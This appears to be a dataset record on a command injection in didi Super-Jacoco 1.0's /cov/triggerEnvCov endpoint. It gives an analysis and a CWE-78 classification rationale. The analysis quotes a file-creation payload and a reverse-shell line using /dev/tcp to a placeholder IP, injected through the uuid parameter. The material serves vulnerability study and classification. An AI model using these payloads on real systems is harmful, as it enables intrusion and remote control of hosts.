  "description": "A vulnerability was found in didi Super-Jacoco 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /cov/triggerEnvCov. The manipulation of the argument uuid leads to **command injection**. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.",

  "reference_content": "Based on the provided content, here's an analysis of the vulnerability:\n\n**Root Cause of Vulnerability:**\nThe vulnerability stems from the lack of proper sanitization or validation of the `uuid` parameter in the `/cov/triggerEnvCov` interface of the `super-jacoco` application. This allows for command injection.\n\n**Weaknesses/Vulnerabilities Present:**\n- **Command Injection:** The primary vulnerability is that the application directly uses the user-supplied `uuid` parameter in a system command without proper sanitization. This allows an attacker to inject arbitrary commands.\n- **Lack of Authorization:** The vulnerability is exploitable by \"unauthorized attackers\", which suggests the `/cov/triggerEnvCov` endpoint may not have adequate access controls.\n\n**Impact of Exploitation:**\n- **Arbitrary Command Execution:** Successful exploitation allows the attacker to execute arbitrary commands on the target system with the privileges of the user running the `super-jacoco` application.\n- **Full System Compromise:** The attacker can potentially gain full control of the target system through the execution of malicious commands. This could include reading or modifying sensitive data, installing malware, or disrupting service.\n- **Reverse Shell:** The provided proof of concept demonstrates the ability to obtain a reverse shell on the target system, granting interactive control to the attacker.\n\n**Attack Vectors:**\n- **HTTP Request Manipulation:** An attacker can craft a malicious HTTP POST request to the `/cov/triggerEnvCov` endpoint. The `uuid` parameter within the JSON body of the request is used to inject arbitrary commands.\n\n**Required Attacker Capabilities/Position:**\n- **Network Access:** The attacker needs to be able to send HTTP requests to the target `super-jacoco` instance, implying network access to the service.\n- **No Authentication Required:** The description states \"unauthorized attackers\" can exploit the vulnerability, suggesting no prior authentication is required to trigger the vulnerability.\n\n**Technical Details:**\n- The vulnerability lies within the `/cov/triggerEnvCov` endpoint.\n- The `uuid` parameter within the JSON request body is vulnerable.\n- The attacker can inject commands using shell operators such as `||`\n- Example payloads include file creation (`touch /tmp/triggerEnvCov1`) and reverse shell execution (`bash -i >& /dev/tcp/x.x.x.x/9333 0>&1`)\n\n**Additional Notes:**\n- The vulnerability was reported on GitHub Issues and has been assigned the ID 48.\n- The vulnerable application is `didi super-jacoco` version 1.0.\n- The issue was reported on Oct 21, 2024 and the submission was accepted on Oct 27, 2024\n\nThis information provides a more detailed explanation of the vulnerability than the placeholder CVE description.",

The vulnerability description states that manipulation of the `uuid` argument leads to **command injection**. The CVE reference links content summary confirms that the root cause is the lack of proper sanitization or validation of the `uuid` parameter, which allows for command injection.\n\nThe retriever results also support this classification, with CWE-78 having a high score.
